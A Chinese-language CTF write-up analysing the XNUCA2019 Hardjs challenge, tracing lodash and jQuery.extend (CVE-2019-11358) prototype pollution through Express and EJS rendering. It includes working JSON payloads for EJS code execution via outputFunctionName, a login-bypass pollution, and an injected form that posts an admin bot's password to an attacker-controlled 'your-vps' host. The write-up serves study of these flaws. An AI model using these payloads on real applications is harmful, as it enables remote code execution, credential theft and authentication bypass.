---
title: XNUCA2019-Hardjs
date: 2019-09-25 18:28:44
tags: CTF
---

### 前言

这篇文章主要是对XNUCA-Hardjs的分析

### jQuery.extend CVE-2019-11358

再jQuery<3.4.0的版本中存在此原型链污染漏洞，不过这个漏洞影响的只是前端解析，所以需要配合一些其他的姿势出打出一些很棒的漏洞效果，这道题对这个漏洞的利用就很微妙。

在extend点可触发，如下

function getAll(allNode){

```javascript
$.ajax({
	url:"/get",
	type:"get",
	async:false,
	success: function(datas){
		for(var i=0 ;i<datas.length; i++){
			$.extend(true,allNode,datas[i])
		}
		 console.log(allNode);
	}
})
}
```

extend语句说明如下

jQuery.extend() 函数用于将一个或多个对象的内容合并到目标对象。

![nxPKFP.png](https://s2.ax1x.com/2019/09/21/nxPKFP.png)

有点类似于merge，jQuery小于3.4的版本都可以通过这个方法来触发原型链污染

### 漏洞分析

这道题是有两种做法的，第一种是通过ejs进行rce，第二种通过前端+后端的组合拳拿flag(这个组合利用太强了)

#### 通过ejs进行rce

首先可以npm audit查看一下漏洞，可以清楚看到是存在原型链污染的

![nxiD4P.png](https://s2.ax1x.com/2019/09/21/nxiD4P.png)



这道题首先要审计的是server.js，题目中关键漏洞代码如下

```javascript
app.get("/get",auth,async function(req,res,next){
var userid = req.session.userid ; 
var sql = "select count(*) count from `html` where userid= ?"
// var sql = "select `dom` from  `html` where userid=? ";
var dataList = await query(sql,[userid]);

if(dataList[0].count == 0 ){
    res.json({})

}else if(dataList[0].count > 5) { // if len > 5 , merge all and update mysql
    
    console.log("Merge the recorder in the database."); 

    var sql = "select `id`,`dom` from  `html` where userid=? ";
    var raws = await query(sql,[userid]);
    var doms = {}
    var ret = new Array(); 

    for(var i=0;i<raws.length ;i++){
        lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));

        var sql = "delete from `html` where id = ?";
        var result = await query(sql,raws[i].id);
    }
    var sql = "insert into `html` (`userid`,`dom`) values (?,?) ";
    var result = await query(sql,[userid, JSON.stringify(doms) ]);

    if(result.affectedRows > 0){
        ret.push(doms);
        res.json(ret);
    }else{
        res.json([{}]);
    }

}else {

    console.log("Return recorder is less than 5,so return it without merge.");
    var sql = "select `dom` from  `html` where userid=? ";
    var raws = await query(sql,[userid]);
    var ret = new Array();

    for( var i =0 ;i< raws.length ; i++){
        ret.push(JSON.parse( raws[i].dom ));
    }

    console.log(ret);
    res.json(ret);
}
});
```

这段代码的逻辑如下：
首先判断datalist[0]中的记录条数，也就是RowDataPacket的数量，这点打断电进去可以看的更详细一些，接着往下说，这里会根据datalist[0]的数量来选择下一步进行的操作，如果大于5，进入如下代码

```javascript
else if(dataList[0].count > 5) { // if len > 5 , merge all and update mysql
console.log("Merge the recorder in the database."); 

var sql = "select `id`,`dom` from  `html` where userid=? ";
var raws = await query(sql,[userid]);
var doms = {}
var ret = new Array(); 

for(var i=0;i<raws.length ;i++){
    lodash.defaultsDeep(doms,JSON.parse( raws[i].dom ));

    var sql = "delete from `html` where id = ?";
    var result = await query(sql,raws[i].id);
}
var sql = "insert into `html` (`userid`,`dom`) values (?,?) ";
var result = await query(sql,[userid, JSON.stringify(doms) ]);

if(result.affectedRows > 0){
    ret.push(doms);
    res.json(ret);
}else{
    res.json([{}]);
}
```

其实这段代码的意思，出题人也提示了我们，首先把数据查出来，然后通过循环遍历，将raws中的dom通过lodash.defaultDeep赋给doms，这里的JSON.parse应该是起了很大的助攻的，简单看一个例子

![nxW1C8.png](https://s2.ax1x.com/2019/09/21/nxW1C8.png)







本来我们给doms应该是下面这样的数组，但是通过上面这样我们可以传过去类似一个多维数组这样去导致原型链污染，后面大概就是一些基操了，先删除对应id的，然后再插入信息，少于5条的判断也就不再赘述了。但是这里是只有原型链污染的，在server.js中是没有可触发的点的，**我们还需要找到一个未被定义的，但是被调用了的一个变量**，所以这里可能在ejs中产生污染，毕竟是用它去渲染的，然后可以跟进一处渲染点，如下：

```javascript
    res.render('login_register',{

        title:" storeHtml | logins ",

        buttonHintF:"登 录",

        buttonHintS:"没有账号?",

        hint:"登录",

        next:"/register"

    });

});
```

跟进分析一下

首先进入responce.js中的render方法

```javascript
res.render = function render(view, options, callback) {
  var app = this.req.app;
  var done = callback;
  var opts = options || {};
  var req = this.req;
  var self = this;
  .....

  // render
  app.render(view, opts, done);
};

```

进入app.render   

```javascript
app.render = function render(name, options, callback) {
  var cache = this.cache;
  var done = callback;
  var engines = this.engines;
  var opts = options;
  var renderOptions = {};
  var view;

  .....
  // render
  tryRender(view, renderOptions, done);
};
```

跟进tryRender

```javascript
function tryRender(view, options, callback) {
  try {
    view.render(options, callback);
  } catch (err) {
    callback(err);
  }
}
```

跟进view.render

```javascript
View.prototype.render = function render(options, callback) {

  debug('render "%s"', this.path);

  this.engine(this.path, options, callback);

};
```

进入engine方法，这里才到了调用ejs

```javascript
exports.renderFile = function () {

  .......

  return tryHandleCache(opts, data, cb);
};

```

跟进tryHandleCache

```javascript
function tryHandleCache(options, data, cb) {
  var result;
  ......
    try {
      result = handleCache(options)(data);
    }
    catch (err) {
      return cb(err);
    }

cb(null, result);

  }
}

```

跟进handleCache

```javascript
function handleCache(options, template) {
  var func;
  var filename = options.filename;
  var hasTemplate = arguments.length > 1;
  ....
  func = exports.compile(template, options);
  if (options.cache) {
    exports.cache.set(filename, func);
  }
  return func;
  }

```

跟进exports.compile

```javascript
exports.compile = function compile(template, opts) {
  var templ;

  ......
  templ = new Template(template, opts);
  return templ.compile();

```

这里new了一个Template对象，跟进去看一下

这个function Template里面的变量很满足原型链污染触发的亚子

```javascript
 opts = opts || {};
  var options = {};
  this.templateText = text;
  this.mode = null;
  this.truncate = false;
  this.currentLine = 1;
  this.source = '';
  this.dependencies = [];
  options.client = opts.client || false;
  options.escapeFunction = opts.escape || opts.escapeFunction || utils.escapeXML;
  options.compileDebug = opts.compileDebug !== false;
  options.debug = !!opts.debug;
  options.filename = opts.filename;
  options.openDelimiter = opts.openDelimiter || exports.openDelimiter || _DEFAULT_OPEN_DELIMITER;
  options.closeDelimiter = opts.closeDelimiter || exports.closeDelimiter || _DEFAULT_CLOSE_DELIMITER;
  options.delimiter = opts.delimiter || exports.delimiter || _DEFAULT_DELIMITER;
  options.strict = opts.strict || false;
  options.context = opts.context;
  options.cache = opts.cache || false;
  options.rmWhitespace = opts.rmWhitespace;
  options.root = opts.root;
  options.outputFunctionName = opts.outputFunctionName;
  options.localsName = opts.localsName || exports.localsName || _DEFAULT_LOCALS_NAME;
  options.views = opts.views;
  options.async = opts.async;

```

一路向下跟进

![nxHzRI.png](https://s2.ax1x.com/2019/09/21/nxHzRI.png)

我们可以清楚的看到outputFunctionName是未定义的，那么通过原型链污染污染这个这个变量，即可rce。

下面的payload打五次，访问/get即可得到flag

```javascript
{"type":"wiki","content":{"constructor": {"prototype": {"outputFunctionName": "a=1; return process.env.FLAG"; var tmp }}}}

```

```
{"type":"wiki","content":{"constructor": {"prototype": {"outputFunctionName": "a=1; return process.env.FLAG//";}}}}

```



#### 前后端组合利用

这个组合利用太强了,膜wonderkun师傅

首先看一下robot.py

```python
import selenium
from selenium import webdriver

chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--headless')
chrome_options.add_argument('--disable-gpu')
chrome_options.add_argument('--disable-xss-auditor')
chrome_options.add_argument('--no-sandbox')
driverpath = '/usr/bin/chromedriver'
host= "http://127.0.0.1/"

username = "admin"
password = 'flag{lihuaiqiu_is_so_Cool}'

client = webdriver.Chrome(chrome_options=chrome_options,executable_path=driverpath)
client.set_page_load_timeout(10)
client.set_script_timeout(10)

print("[*] start chrome browser ......")

def login():

client.get(host)
client.set_page_load_timeout(10)
client.set_script_timeout(10)

try:
    client.switch_to_alert().accept()
except selenium.common.exceptions.NoAlertPresentException:
    pass

usernameForm = client.find_element_by_xpath("//input[@name='username']")
passwordForm = client.find_element_by_xpath("//input[@name='password']")

usernameForm.clear()
passwordForm.clear()
usernameForm.send_keys(username)
passwordForm.send_keys(password)
loginButton = client.find_element_by_xpath("//input[@type='submit']")
loginButton.click()
print(client.current_url)

# content = driver.page_source.encode('utf-8')

# print(content)

if __name__=='__main__':
    try:
        login()
    except Exception as e:
        pass

# print(e)

    finally:
        client.quit()

```

首先可以看出密码就是我们要的flag，这里我本地为了方便改了flag。可以看到这个脚本是直接访问的http://127.0.0.1。然后去通过Xpath来搜索input name 和password，最后去提交flag在这个找到的表单里

那我们如果在我们的主页中提交一个表单，将flag发送到我们的vps这样可行吗？

![nzJBDJ.png](https://s2.ax1x.com/2019/09/21/nzJBDJ.png)

很明显是不行了，因为沙盒直接将脚本的执行阻断掉了，那么我们可以试着将这个表单放到沙盒外，这样就可以拿到flag了

关键在于app.js,在app.js中我们可以发现jQuery.extend CVE-2019-11358这个原型链污染漏洞，具体如下

```javascript
function getAll(allNode){
$.ajax({
    url:"/get",
    type:"get",
    async:false,
    success: function(datas){
        for(var i=0 ;i<datas.length; i++){
            $.extend(true,allNode,datas[i])
        }
         console.log(allNode);
    }
})
}

```

我们可以通过datas去污染allNode,那么接下来去看看这两个分别是什么吧

![nzNvrD.png](https://s2.ax1x.com/2019/09/21/nzNvrD.png)

大意就是把我添加的放到Allnode里去之后再去渲染，那么这个污染点就ok了，下面接着去找一下出触发点

```javascript
(function(){
	var hints = {
		header : "自定义内容",
		notice: "自定义公告",
		wiki : "自定义wiki",
		button:"自定义内容",
		message: "自定义留言内容"
	};
	for(key in hints){
		// console.log(key);
		element = $("li[type='"+key+"']"); 
		if(element){
			element.find("span.content").html(hints[key]);
		}
	}
})();

```

这个就是触发点了，首先遍历hints对象中的key，但是我们上面可是有原型链污染的，所以这里可以遍历到我们的原型链污染的值，所以触发点就在这里了，接着向下跟着，这里要找span标签并且class为content的那个地方并且渲染key对应的值，这里就正好符合我们所需要的要求了，由于这个app.js是结合index.ejs进行渲染的，所以我们需要在index.ejs中找到这个span并且这个span位于sandbox外

在sandbox中类似这种的li标签是都在沙盒內部的

```javascript
$tmp = $("li[type='header']");
$newNode = $( $tmp.html() );
$newNode.find("span.content").html(dom[key][0]);
// console.log($newNode.html());
viewport.appendChild( $newNode[0] );
break;

```

最终发现同时满足li和具有span-content的地方如下

```html
  <li type="logger">
      <div class="col-sm-12 col-sm-centered">
          <pre class="am-pre-scrollable">
              <span class="am-text-success">[Tue Jan 11 17:32:52 9]</span> <span class="am-text-danger">[info]</span> <span class="content">StoreHtml init success .....</span>
          </pre>
      </div>
  </li>

```

我们可以把这个span-content的值改为我们获取flag的表单

利用Payload为

```
{"type":"wiki","content":{"__proto__":{"logger":"<form action='http://your-vps' method='post' class='am-form'><input type='text' name='username' id='email' value=''><input type='password' name='password' id='password' value=''><input type='submit' name='' ></form>"}}

```

这样即可在object中加上logger，还要处理一下登陆的问题，因为robot.py没有登陆的操作，下面payload打五次，绕过登陆

```
{"type":"test","content":{"constructor":{"prototype":{"login":true,"userid":1}}}}

```

最后监听一下端口，拿到模拟flag

![nz0Hcq.png](https://s2.ax1x.com/2019/09/21/nz0Hcq.png)

最后的话看了一下这个extend

datas

![uS9Hu4.png](https://s2.ax1x.com/2019/09/21/uS9Hu4.png)

allnode

![uSEAaQ.png](https://s2.ax1x.com/2019/09/21/uSEAaQ.png)

可以看出这里通过添加进来的数组进行污染的，之前在extend的时候其实就把我们的\_\_proto__做为了data中数组对象的原型链也就是操控了Object，那么添加到新的allnode中，依然保持这样，所以是这样直接造成了污染

在lodash中其实原理个人感觉也是和这个差不多的，多了一个json parse解析成数组的步骤，再直接加刀那个对象里去，依然是通过这个数组对象进行原型链污染

### 参考链接

https://www.xmsec.cc/prototype-pollution-notes/

https://xz.aliyun.com/t/6113

https://xz.aliyun.com/t/6101

https://github.com/NeSE-Team/OurChallenges/tree/master/XNUCA2019Qualifier/Web/hardjs